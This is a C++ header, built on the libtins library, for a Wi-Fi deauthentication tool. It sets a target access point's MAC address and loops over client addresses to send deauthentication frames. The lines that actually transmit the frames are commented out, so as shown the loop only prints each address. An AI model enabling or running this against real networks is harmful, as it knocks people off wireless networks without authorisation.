#ifndef __DEAUTH_SENDER__
#define __DEAUTH_SENDER__

#include <iostream>
#include <set>
#include <tins/tins.h>

using namespace std;
using namespace Tins;

class DeauthSender {
private:
    string iface_name;
    HWAddress<6> target;
    set<HWAddress<6>> *address_set;
    bool endflag = false;
public:
    explicit DeauthSender(set<HWAddress<6>> *set, const string &iface, const string &target) {
        this->address_set = set;
        this->iface_name = iface;
        this->target = HWAddress<6>(target);
    }

    void sendPacket() {
        while (!this->endflag) {
            if (this->address_set == nullptr) return;
            Dot11Deauthentication deauth;
            RadioTap radio = RadioTap();
            deauth.addr2(this->target);
            deauth.addr3(this->target);

            PacketSender sender(this->iface_name, 100);

            system("clear");
            for (auto iter : *this->address_set) {
                cout << "send: " << iter << endl;
//                deauth.addr1(iter);
//                RadioTap pkt = radio / deauth;
//                sender.send(pkt);
            }
        }
    }

    bool isEnd() {
        return this->endflag;
    }

    void end() {
        this->endflag = true;
    }
};

#endif